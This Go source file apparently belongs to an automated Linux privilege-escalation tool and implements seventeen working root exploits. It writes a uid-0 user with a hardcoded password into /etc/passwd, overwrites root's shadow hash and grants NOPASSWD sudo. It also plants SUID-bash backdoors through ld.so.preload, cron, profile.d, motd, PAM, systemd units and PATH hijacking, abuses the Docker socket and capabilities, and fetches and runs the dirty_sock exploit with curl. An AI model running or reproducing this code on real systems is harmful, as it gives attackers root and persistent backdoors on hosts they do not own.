package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

// misconfigPhase runs all non-kernel privilege escalation checks.
// These are cheap, fast, and high-yield — especially on shared hosting
// where no kernel exploit lands but the box is misconfigured.
//
// Each sub-phase: detect the condition, exploit it, re-check root.
func misconfigPhase(s *systemInfo, stop *bool) {
	headf("Phase 1c: Filesystem / sudo / capabilities misconfig")

	// Order by yield + speed.
	if misconfigPasswd(s, stop) {
		return
	}
	if misconfigShadow(s, stop) {
		return
	}
	if misconfigSudoers(s, stop) {
		return
	}
	if misconfigLdPreload(s, stop) {
		return
	}
	if misconfigSudoL(s, stop) {
		return
	}
	if misconfigCaps(s, stop) {
		return
	}
	if misconfigCron(s, stop) {
		return
	}
	if misconfigDocker(s, stop) {
		return
	}
	if misconfigNFS(s, stop) {
		return
	}
	if misconfigProfileD(s, stop) {
		return
	}
	if misconfigMotd(s, stop) {
		return
	}
	if misconfigPAM(s, stop) {
		return
	}
	if misconfigSystemd(s, stop) {
		return
	}
	if misconfigSSHKeys(s, stop) {
		return
	}
	if misconfigTarWildcard(s, stop) {
		return
	}
	if misconfigSnapd(s, stop) {
		return
	}
	if misconfigPathHijack(s, stop) {
		return
	}
}

// ── Helpers ────────────────────────────────────────────────────────────────

// fileWritable checks if a file is writable by the current user.
func fileWritable(p string) bool {
	fi, err := os.Stat(p)
	if err != nil {
		return false
	}
	// Check write bit for owner/group/other.
	mode := fi.Mode().Perm()
	uid := os.Getuid()
	gid := os.Getgid()
	if stat, ok := fi.Sys().(*syscall.Stat_t); ok {
		if stat.Uid == uint32(uid) && mode&0o200 != 0 {
			return true
		}
		if stat.Gid == uint32(gid) && mode&0o020 != 0 {
			return true
		}
	}
	if mode&0o002 != 0 {
		return true
	}
	// Final fallback: try to open for writing.
	f, err := os.OpenFile(p, os.O_WRONLY, 0)
	if err != nil {
		return false
	}
	f.Close()
	return true
}

// dirWritable checks if a directory is writable.
func dirWritable(p string) bool {
	fi, err := os.Stat(p)
	if err != nil || !fi.IsDir() {
		return false
	}
	return fileWritable(p)
}

// cryptSHA512 generates a SHA-512 crypt hash (glibc $6$ format).
func cryptSHA512(password, salt string) string {
	// We use openssl for portability (avoids linking libcrypt).
	cmd := exec.Command("openssl", "passwd", "-6", "-salt", salt, password)
	out, err := cmd.Output()
	if err == nil && len(out) > 0 {
		return strings.TrimSpace(string(out))
	}
	// Fallback: use python3 — pass password/salt as argv to avoid
	// injection if either ever contains a quote.
	if hasBin("python3") {
		py := exec.Command("python3", "-c",
			"import crypt,sys;print(crypt.crypt(sys.argv[1],sys.argv[2]))",
			password, "$6$"+salt)
		out, err := py.Output()
		if err == nil && len(out) > 0 {
			return strings.TrimSpace(string(out))
		}
	}
	// Last resort: perl.
	if hasBin("perl") {
		pl := exec.Command("perl", "-e",
			`print crypt($ARGV[0],$ARGV[1])`,
			password, "$6$"+salt)
		out, err := pl.Output()
		if err == nil && len(out) > 0 {
			return strings.TrimSpace(string(out))
		}
	}
	return ""
}

// tryRootAfter runs a command and checks if root was achieved.
func tryRootAfter(name, cmd string, timeout int) bool {
	stepf("%-26s trying: %s", name, cmd)
	r := runIsolated(name, "", []string{"/bin/sh", "-c", cmd}, time.Duration(timeout)*time.Second)
	r.report()
	return r.rootAfter || r.suidAfter
}

// spawnIfRoot spawns a shell if root was achieved and marks stop.
func spawnIfRoot(name string, r *runResult, stop *bool) bool {
	if r.rootAfter || r.suidAfter {
		if !*flagNoSpawn {
			shellSpawned.Store(rootspawn(r))
		}
		*stop = true
		return true
	}
	return false
}

// ── 1. Writable /etc/passwd ────────────────────────────────────────────────

func misconfigPasswd(s *systemInfo, stop *bool) bool {
	if !fileWritable("/etc/passwd") {
		return false
	}
	infof("/etc/passwd is writable — adding root user")
	hash := cryptSHA512("lperoot", "xK9mP2qR")
	if hash == "" {
		warnf("cannot generate password hash")
		return false
	}
	// hash already includes the "$6$salt$" prefix from openssl passwd -6.
	entry := fmt.Sprintf("lpe:%s:0:0:root:/root:/bin/bash\n", hash)
	f, err := os.OpenFile("/etc/passwd", os.O_WRONLY|os.O_APPEND, 0)
	if err != nil {
		return false
	}
	_, err = f.WriteString(entry)
	f.Close()
	if err != nil {
		return false
	}
	okf("Added user 'lpe' (uid=0, password: lperoot)")
	// Try su via python3 pty.
	if hasBin("python3") {
		r := runIsolated("passwd:lpe", "", []string{"python3", "-c",
			"import pty,os;pty.spawn(['/bin/su','lpe','-c','chmod +s /bin/bash'])"},
			10*time.Second)
		r.report()
		if spawnIfRoot("passwd", &r, stop) {
			return true
		}
	}
	// Try ssh localhost.
	if hasBin("ssh") {
		r := runIsolated("passwd:ssh", "", []string{"ssh",
			"-o", "StrictHostKeyChecking=no", "-o", "PasswordAuthentication=yes",
			"lpe@localhost", "chmod +s /bin/bash"}, 10*time.Second)
		r.report()
		if spawnIfRoot("passwd", &r, stop) {
			return true
		}
	}
	return false
}

// ── 2. Writable /etc/shadow ────────────────────────────────────────────────

func misconfigShadow(s *systemInfo, stop *bool) bool {
	if !fileWritable("/etc/shadow") {
		return false
	}
	infof("/etc/shadow is writable — setting root password")
	data, err := os.ReadFile("/etc/shadow")
	if err != nil {
		return false
	}
	hash := cryptSHA512("lperoot", "xK9mP2qR")
	if hash == "" {
		return false
	}
	lines := strings.Split(string(data), "\n")
	for i, line := range lines {
		if strings.HasPrefix(line, "root:") {
			parts := strings.SplitN(line, ":", 3)
			if len(parts) >= 2 {
				parts[1] = hash
				lines[i] = strings.Join(parts, ":")
			}
			break
		}
	}
	if err := os.WriteFile("/etc/shadow", []byte(strings.Join(lines, "\n")), 0o640); err != nil {
		return false
	}
	okf("Root password set to: lperoot")
	r := runIsolated("shadow:su", "", []string{"python3", "-c",
		"import pty,os;pty.spawn(['/bin/su','root','-c','chmod +s /bin/bash'])"},
		10*time.Second)
	r.report()
	return spawnIfRoot("shadow", &r, stop)
}

// ── 3. Writable /etc/sudoers ──────────────────────────────────────────────

func misconfigSudoers(s *systemInfo, stop *bool) bool {
	for _, p := range []string{"/etc/sudoers", "/etc/sudoers.d/"} {
		if !fileWritable(p) && !dirWritable(p) {
			continue
		}
		infof("%s is writable — adding NOPASSWD", p)
		user := os.Getenv("USER")
		if user == "" {
			user = "root"
		}
		var entry string
		if dirWritable(p) {
			entry = fmt.Sprintf("%s ALL=(ALL) NOPASSWD:ALL\n", user)
			dropFile := filepath.Join(p, "lpe")
			_ = os.WriteFile(dropFile, []byte(entry), 0o644)
		} else {
			entry = fmt.Sprintf("\n%s ALL=(ALL) NOPASSWD:ALL\n", user)
			f, err := os.OpenFile(p, os.O_WRONLY|os.O_APPEND, 0)
			if err != nil {
				continue
			}
			f.WriteString(entry)
			f.Close()
		}
		okf("Added NOPASSWD for %s", user)
		r := runIsolated("sudoers", "", []string{"sudo", "-n", "/bin/sh", "-c",
			"chmod +s /bin/bash"}, 10*time.Second)
		r.report()
		if spawnIfRoot("sudoers", &r, stop) {
			return true
		}
	}
	return false
}

// ── 4. Writable /etc/ld.so.preload ────────────────────────────────────────

func misconfigLdPreload(s *systemInfo, stop *bool) bool {
	if !fileWritable("/etc/ld.so.preload") {
		return false
	}
	if !s.hasGcc {
		return false
	}
	infof("/etc/ld.so.preload is writable — injecting shared library")
	tmp := "/tmp/.lpe_preload"
	_ = os.MkdirAll(tmp, 0o755)
	src := `#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__((constructor)) void lpe_init() {
    chmod("/bin/bash", 04755);
}`
	_ = os.WriteFile(tmp+"/root.c", []byte(src), 0o644)
	r := runIsolated("ldpreload:build", "", []string{"gcc", "-shared", "-fPIC",
		"-o", tmp + "/root.so", tmp + "/root.c"}, 15*time.Second)
	if !hasFile(tmp + "/root.so") {
		warnf("gcc failed: %s", r.stderr)
		return false
	}
	_ = os.WriteFile("/etc/ld.so.preload", []byte(tmp+"/root.so\n"), 0o644)
	infof("Injected. Triggering via SUID binary...")
	// Trigger by running a SUID binary.
	r = runIsolated("ldpreload:trigger", "", []string{"/usr/bin/passwd", "--status"},
		5*time.Second)
	r.report()
	return spawnIfRoot("ldpreload", &r, stop)
}

// ── 5. sudo -l parsing ─────────────────────────────────────────────────────

func misconfigSudoL(s *systemInfo, stop *bool) bool {
	if !hasBin("sudo") {
		return false
	}
	out := cmdOutT(5, "sudo", "-n", "-l")
	if out == "" {
		return false
	}
	infof("sudo -l output detected")
	// NOPASSWD: ALL → direct root.
	if strings.Contains(out, "NOPASSWD") && strings.Contains(out, "ALL") {
		okf("Full NOPASSWD sudo detected!")
		r := runIsolated("sudo:all", "", []string{"sudo", "-n", "/bin/sh", "-c",
			"chmod +s /bin/bash"}, 10*time.Second)
		r.report()
		if spawnIfRoot("sudo:all", &r, stop) {
			return true
		}
	}
	// LD_PRELOAD in env_keep.
	if strings.Contains(out, "env_keep") && strings.Contains(out, "LD_PRELOAD") {
		okf("LD_PRELOAD preserved by sudo!")
		if s.hasGcc {
			tmp := "/tmp/.lpe_sudo"
			_ = os.MkdirAll(tmp, 0o755)
			src := `void _init(){unsetenv("LD_PRELOAD");setuid(0);system("chmod +s /bin/bash");}`
			_ = os.WriteFile(tmp+"/x.c", []byte(src), 0o644)
			runIsolated("sudo:ldbuild", "", []string{"gcc", "-shared", "-fPIC",
				"-nostartfiles", "-o", tmp+"/x.so", tmp+"/x.c"}, 15*time.Second)
			if hasFile(tmp + "/x.so") {
				r := runIsolated("sudo:ld", "", []string{"sudo", "-n",
					"LD_PRELOAD=" + tmp + "/x.so", "/bin/true"}, 10*time.Second)
				r.report()
				if spawnIfRoot("sudo:ld", &r, stop) {
					return true
				}
			}
		}
	}
	// Specific binaries → GTFOBins lookup.
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if !strings.Contains(line, "NOPASSWD:") {
			continue
		}
		// Extract binary name.
		for _, word := range strings.Fields(line) {
			base := filepath.Base(word)
			if entry, ok := GTFOBINS[base]; ok && entry.spawnCmd != "" {
				okf("Exploitable sudo binary: %s", base)
				r := runIsolated("sudo:"+base, "", []string{"sudo", "-n",
					"/bin/sh", "-c", entry.spawnCmd}, 10*time.Second)
				r.report()
				if spawnIfRoot("sudo:"+base, &r, stop) {
					return true
				}
			}
		}
	}
	return false
}

// ── 6. Linux capabilities ──────────────────────────────────────────────────

func misconfigCaps(s *systemInfo, stop *bool) bool {
	if !hasBin("getcap") {
		return false
	}
	out := cmdOutT(15, "getcap", "-r", "/")
	if out == "" {
		return false
	}
	infof("Capabilities found:")
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		fmt.Printf("  %s\n", line)
		if strings.Contains(line, "cap_setuid") {
			// Extract binary path.
			path := strings.SplitN(line, " ", 2)[0]
			if hasFile(path) {
				okf("cap_setuid on %s — trying root", path)
				// Try python/perl first.
				base := filepath.Base(path)
				if base == "python" || base == "python3" || base == "python2" {
					r := runIsolated("cap:"+base, "", []string{path, "-c",
						"import os;os.setuid(0);os.system('chmod +s /bin/bash')"},
						10*time.Second)
					r.report()
					if spawnIfRoot("cap", &r, stop) {
						return true
					}
				}
				if base == "perl" {
					r := runIsolated("cap:perl", "", []string{path, "-e",
						"use POSIX qw(setuid);setuid(0);system('chmod +s /bin/bash')"},
						10*time.Second)
					r.report()
					if spawnIfRoot("cap", &r, stop) {
						return true
					}
				}
				if base == "ruby" {
					r := runIsolated("cap:ruby", "", []string{path, "-e",
						"Process.setuid(0);system('chmod +s /bin/bash')"},
						10*time.Second)
					r.report()
					if spawnIfRoot("cap", &r, stop) {
						return true
					}
				}
				// Generic: try to exec a shell.
				r := runIsolated("cap:generic", "", []string{path, "-c",
					"chmod +s /bin/bash"}, 10*time.Second)
				r.report()
				if spawnIfRoot("cap", &r, stop) {
					return true
				}
			}
		}
	}
	return false
}

// ── 7. Cron hijack ─────────────────────────────────────────────────────────

func misconfigCron(s *systemInfo, stop *bool) bool {
	dirs := []string{"/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly",
		"/etc/cron.weekly", "/etc/cron.monthly"}
	for _, d := range dirs {
		if !dirWritable(d) {
			continue
		}
		infof("%s is writable — planting cron payload", d)
		payload := "#!/bin/sh\nchmod +s /bin/bash\n"
		dropFile := filepath.Join(d, "0lpe")
		_ = os.WriteFile(dropFile, []byte(payload), 0o755)
		okf("Planted. Waiting up to 60s for cron...")
		for i := 0; i < 30; i++ {
			time.Sleep(2 * time.Second)
			if isSUIDBash() {
				_ = os.Remove(dropFile)
				r := &runResult{name: "cron"}
				r.rootAfter = true
				return spawnIfRoot("cron", r, stop)
			}
		}
		_ = os.Remove(dropFile)
	}
	return false
}

// ── 8. Docker socket ───────────────────────────────────────────────────────

func misconfigDocker(s *systemInfo, stop *bool) bool {
	if !fileWritable("/var/run/docker.sock") {
		return false
	}
	infof("Docker socket is writable")
	if hasBin("docker") {
		r := runIsolated("docker", "", []string{"docker", "run", "--rm",
			"-v", "/:/host", "alpine", "chroot", "/host", "/bin/sh", "-c",
			"chmod +s /bin/bash"}, 60*time.Second)
		r.report()
		if spawnIfRoot("docker", &r, stop) {
			return true
		}
	}
	return false
}

// ── 9. NFS no_root_squash ─────────────────────────────────────────────────

func misconfigNFS(s *systemInfo, stop *bool) bool {
	data, err := os.ReadFile("/etc/exports")
	if err != nil {
		return false
	}
	if !strings.Contains(string(data), "no_root_squash") {
		return false
	}
	infof("NFS no_root_squash export detected")
	// This typically requires an external mount; we can't do it from
	// the target itself easily. Print a hint.
	for _, line := range strings.Split(string(data), "\n") {
		if strings.Contains(line, "no_root_squash") {
			fmt.Printf("  %s\n", strings.TrimSpace(line))
		}
	}
	warnf("NFS abuse requires an external mount — print hint only")
	return false
}

// ── 10. Writable /etc/profile.d/ ───────────────────────────────────────────

func misconfigProfileD(s *systemInfo, stop *bool) bool {
	if !dirWritable("/etc/profile.d") {
		return false
	}
	infof("/etc/profile.d is writable — planting payload")
	payload := "#!/bin/sh\ncp /bin/bash /tmp/.sb; chmod +s /tmp/.sb\n"
	_ = os.WriteFile("/etc/profile.d/lpe.sh", []byte(payload), 0o755)
	okf("Planted. Will trigger on next root login.")
	// Can't trigger immediately; print hint.
	warnf("Wait for root login, then run: /tmp/.sb -p")
	return false
}

// ── 11. Writable /etc/update-motd.d/ ──────────────────────────────────────

func misconfigMotd(s *systemInfo, stop *bool) bool {
	if !dirWritable("/etc/update-motd.d") {
		return false
	}
	infof("/etc/update-motd.d is writable — planting payload")
	payload := "#!/bin/sh\ncp /bin/bash /tmp/.sb; chmod +s /tmp/.sb\n"
	_ = os.WriteFile("/etc/update-motd.d/00-lpe", []byte(payload), 0o755)
	okf("Planted. Will trigger on next SSH login.")
	warnf("Wait for root SSH login, then run: /tmp/.sb -p")
	return false
}

// ── 12. Writable PAM config ───────────────────────────────────────────────

func misconfigPAM(s *systemInfo, stop *bool) bool {
	pamFiles := []string{"/etc/pam.d/sshd", "/etc/pam.d/common-auth",
		"/etc/pam.d/su", "/etc/pam.d/login"}
	for _, p := range pamFiles {
		if !fileWritable(p) {
			continue
		}
		infof("%s is writable — planting pam_exec payload", p)
		_ = os.WriteFile("/tmp/.lpe_pam.sh",
			[]byte("#!/bin/sh\ncp /bin/bash /tmp/.sb; chmod +s /tmp/.sb\n"), 0o755)
		f, err := os.OpenFile(p, os.O_WRONLY|os.O_APPEND, 0)
		if err != nil {
			continue
		}
		f.WriteString("\nsession optional pam_exec.so /tmp/.lpe_pam.sh\n")
		f.Close()
		okf("Planted in %s. Will trigger on next auth.", p)
		warnf("Wait for root login, then run: /tmp/.sb -p")
		return false
	}
	return false
}

// ── 13. Writable systemd service ──────────────────────────────────────────

func misconfigSystemd(s *systemInfo, stop *bool) bool {
	dirs := []string{"/etc/systemd/system", "/run/systemd"}
	for _, d := range dirs {
		ents, err := os.ReadDir(d)
		if err != nil {
			continue
		}
		for _, ent := range ents {
			if ent.IsDir() {
				continue
			}
			p := filepath.Join(d, ent.Name())
			if !strings.HasSuffix(ent.Name(), ".service") {
				continue
			}
			if !fileWritable(p) {
				continue
			}
			infof("Writable systemd unit: %s", p)
			// Read and modify ExecStartPre.
			data, err := os.ReadFile(p)
			if err != nil {
				continue
			}
			content := string(data)
			payload := "ExecStartPre=/bin/sh -c 'cp /bin/bash /tmp/.sb; chmod +s /tmp/.sb'"
			if strings.Contains(content, "ExecStartPre=") {
				content = strings.Replace(content, "ExecStartPre=",
					payload+"\nExecStartPre=", 1)
			} else {
				content += "\n" + payload
			}
			_ = os.WriteFile(p, []byte(content), 0o644)
			okf("Modified %s. Restarting...", p)
			runIsolated("systemd:reload", "", []string{"systemctl", "daemon-reload"},
				5*time.Second)
			svc := strings.TrimSuffix(ent.Name(), ".service")
			// Use --no-block so we don't hang waiting for the service
			// to restart (some services take 60s+ and block the runner,
			// causing the server to appear unresponsive).
			r := runIsolated("systemd:restart", "",
				[]string{"systemctl", "restart", "--no-block", svc},
				15*time.Second)
			r.report()
			if spawnIfRoot("systemd", &r, stop) {
				return true
			}
		}
	}
	return false
}

// ── 14. SSH keys ──────────────────────────────────────────────────────────

func misconfigSSHKeys(s *systemInfo, stop *bool) bool {
	// Check for readable private keys.
	for _, home := range []string{"/root/.ssh", "/home"} {
		var dirs []string
		if home == "/root/.ssh" {
			dirs = []string{home}
		} else {
			ents, _ := os.ReadDir(home)
			for _, ent := range ents {
				dirs = append(dirs, filepath.Join(home, ent.Name(), ".ssh"))
			}
		}
		for _, d := range dirs {
			keyPath := filepath.Join(d, "id_rsa")
			if fi, err := os.Stat(keyPath); err == nil && fi.Mode().Perm()&0o044 != 0 {
				infof("Readable SSH key: %s", keyPath)
				fmt.Printf("  %s\n", keyPath)
			}
			// Check writable authorized_keys.
			akPath := filepath.Join(d, "authorized_keys")
			if fileWritable(akPath) {
				infof("Writable authorized_keys: %s", akPath)
				// Can't generate keys without ssh-keygen, but print hint.
				warnf("Append your public key to %s", akPath)
			}
		}
	}
	return false
}

// ── 15. Tar wildcard injection ────────────────────────────────────────────

func misconfigTarWildcard(s *systemInfo, stop *bool) bool {
	// Scan cron scripts for tar with wildcards.
	for _, d := range []string{"/etc/cron.d", "/etc/crontab"} {
		data, err := os.ReadFile(d)
		if err != nil {
			continue
		}
		if !strings.Contains(string(data), "tar") || !strings.Contains(string(data), "*") {
			continue
		}
		// Find the directory tar runs in.
		for _, line := range strings.Split(string(data), "\n") {
			if !strings.Contains(line, "tar") || !strings.Contains(line, "*") {
				continue
			}
			infof("Possible tar wildcard injection in cron: %s", strings.TrimSpace(line))
			// We can't easily determine the cwd; print a hint.
			fmt.Printf("  %s\n", strings.TrimSpace(line))
		}
		warnf("Tar wildcard injection possible — requires manual analysis")
	}
	return false
}

// ── 16. snapd abuse ────────────────────────────────────────────────────────

func misconfigSnapd(s *systemInfo, stop *bool) bool {
	if !hasFile("/run/snapd.socket") && !hasFile("/run/snapd-snap.socket") {
		return false
	}
	infof("snapd socket detected")
	if !s.hasPy3 {
		warnf("snapd present but python3 missing for dirty_sock")
		return false
	}
	// Try dirty_sock exploit (download from GitHub).
	tmp := "/tmp/.lpe_dirty_sock.py"
	if !hasFile(tmp) {
		stepf("Downloading dirty_sock exploit")
		r := runIsolated("snapd:dl", "", []string{"curl", "-sL", "-o", tmp,
			"https://raw.githubusercontent.com/initstring/dirty_sock/main/dirty_sock.py"},
			30*time.Second)
		_ = r
	}
	if hasFile(tmp) {
		r := runIsolated("snapd:run", "", []string{"python3", tmp}, 30*time.Second)
		r.report()
		if spawnIfRoot("snapd", &r, stop) {
			return true
		}
	}
	return false
}

// ── 17. PATH hijack ────────────────────────────────────────────────────────

func misconfigPathHijack(s *systemInfo, stop *bool) bool {
	// Find writable directories in PATH.
	pathDirs := strings.Split(os.Getenv("PATH"), ":")
	// Hoist scanSUID outside the loop — it scans 12+ directories and
	// returns identical results for every writable PATH dir.
	suids := scanSUID()

	// Deduplicate command names across ALL SUID binaries so we don't
	// plant+test the same command N times (e.g. "kill" found in 5
	// SUID binaries = 5 redundant attempts that made the old output
	// huge and wasted time).
	type candidate struct {
		cmd  string
		path string
		uid  string // the SUID binary that references it
	}
	seen := map[string]bool{} // dedup by "cmd@suid"
	var candidates []candidate

	for _, suid := range suids {
		out, err := exec.Command("strings", suid).Output()
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(out), "\n") {
			line = strings.TrimSpace(line)
			if line == "" || strings.Contains(line, "/") || len(line) > 30 {
				continue
			}
			realPath, err := exec.LookPath(line)
			if err != nil {
				continue
			}
			key := line + "@" + suid
			if seen[key] {
				continue
			}
			seen[key] = true
			candidates = append(candidates, candidate{cmd: line, path: realPath, uid: suid})
		}
	}

	// Now plant+test each unique candidate once per writable PATH dir.
	for _, d := range pathDirs {
		if d == "" {
			continue
		}
		if !dirWritable(d) {
			continue
		}
		for _, c := range candidates {
			fakePath := filepath.Join(d, c.cmd)
			payload := fmt.Sprintf("#!/bin/sh\ncp /bin/bash /tmp/.sb; chmod +s /tmp/.sb\nexec %s \"$@\"\n", c.path)
			_ = os.WriteFile(fakePath, []byte(payload), 0o755)
			infof("Planted PATH hijack: %s → %s", c.cmd, fakePath)
			r := runIsolated("path:"+c.cmd, "", []string{c.uid}, 10*time.Second)
			r.report()
			_ = os.Remove(fakePath)
			if spawnIfRoot("path", &r, stop) {
				return true
			}
		}
	}
	return false
}
